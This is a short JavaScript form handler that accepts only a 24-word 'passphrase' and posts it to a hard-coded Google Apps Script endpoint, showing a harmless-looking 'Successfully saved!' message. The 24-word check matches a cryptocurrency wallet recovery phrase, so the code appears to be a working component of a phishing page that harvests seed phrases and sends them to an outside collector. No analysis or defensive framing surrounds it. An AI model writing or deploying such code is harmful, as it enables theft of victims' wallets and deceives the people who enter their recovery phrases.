// Function to handle form submission
async function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';

    const myButton = document.getElementById('b1');
    const myButton2 = document.getElementById('b2');
    myButton.disabled = true;
    myButton2.disabled = true;

    const form = document.getElementById('myForm');
    const inputValue = form.elements['mf-texts'].value.trim();

    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return;
    }

    // Google Apps Script Web App URL (Replace with your actual URL)
    const scriptURL = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec";

    try {
        const response = await fetch(scriptURL, {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
            },
            body: new URLSearchParams({ text: inputValue }),
        });

        const result = await response.json();
        if (result.status === "success") {
            errorElement.textContent = "Successfully saved!";
        } else {
            errorElement.textContent = "Error saving file: " + result.message;
        }
    } catch (error) {
        console.error("Error:", error);
        errorElement.textContent = "Failed to save input.";
    } finally {
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    }
}

// Add event listener to the form
document.getElementById('myForm').addEventListener('submit', handleSubmit);


